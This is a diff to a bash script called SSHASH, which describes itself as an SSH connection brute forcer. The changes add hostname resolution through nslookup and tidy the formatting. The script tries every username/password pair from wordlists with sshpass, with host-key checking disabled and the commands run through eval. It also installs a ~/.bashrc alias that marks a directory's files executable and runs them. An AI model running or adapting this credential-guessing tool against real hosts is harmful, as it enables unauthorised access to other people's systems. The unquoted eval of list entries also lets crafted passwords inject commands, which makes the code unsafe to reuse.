@@ -1,19 +1,19 @@
 #!/bin/bash
 
 alias_to_add='alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
-
-if ! grep -qxF "$alias_to_add" ~/.bashrc; then
+                                                                           if ! grep -qxF "$alias_to_add" ~/.bashrc; then
     echo "$alias_to_add" >> ~/.bashrc
     echo "Alias ajouté à ~/.bashrc"
-else                                                                           echo "L'alias est déjà présent dans ~/.bashrc"
+else
+    echo "L'alias est déjà présent dans ~/.bashrc"
 fi
-
 
 clear
 trap 'echo -e "\nOperation aborted by the user."; exit' INT
 
 function test_ssh_password {
-    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"                                                 if output=$(eval "$ssh_command" 2>&1); then
+    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
+    if output=$(eval "$ssh_command" 2>&1); then
         if [[ $output == *"SSH Login Successful"* ]]; then
             echo "SSH Login Successful - $1:$2"
         else
@@ -28,16 +28,23 @@ function test_ssh_password {
 while getopts ":u:i:p:l:" opt; do
     case $opt in
         u) userlist_path=$OPTARG ;;
-        i) host_ip=$OPTARG ;;
+        i) host_ip_or_url=$OPTARG ;;
         p) ssh_port=$OPTARG ;;
         l) passwordlist_path=$OPTARG ;;
         \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
     esac
 done
 
-if [[ -z $host_ip ]]; then
-    echo "Please provide the IP address using the -i option."
+if [[ -z $host_ip_or_url ]]; then
+    echo "Please provide the IP address or URL using the -i option."
     exit 1
+fi
+
+# Additional check for IP or URL
+if [[ $host_ip_or_url =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    host_ip=$host_ip_or_url
+else
+    host_ip=$(nslookup $host_ip_or_url | awk '/^Address: / { print $2 }')
 fi
 
 if [[ -z $userlist_path ]]; then
@@ -57,7 +64,6 @@ fi
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
 
-
 echo "         __. __..  ..__. __..  .  "
 echo "        (__ (__ |__|[__](__ |__|  "
 echo "        .__).__)|  ||  |.__)|  |  "
@@ -65,8 +71,8 @@ echo
 echo "   * SSHASH CONNECTION BRUTE FORCER *   "
 echo "{>====================================<}"
 
-# Display target, port, and passlist filenames
-for i in "|--{[+]TARGET} => $host_ip" "|--{[+]PORT} => ${ssh_port:-22}" "|--{[+]USERLIST} => $(basename "$userlist_path")" "|--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
+# Display target, port, and passlist filenames, including IP or URL
+for i in "|--{[+]TARGET} => $host_ip_or_url" "|--{[+]PORT} => ${ssh_port:-22}" "|--{[+]USERLIST} => $(basename "$userlist_path")" "|--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
     sleep 0.2
     echo "$i"
 done
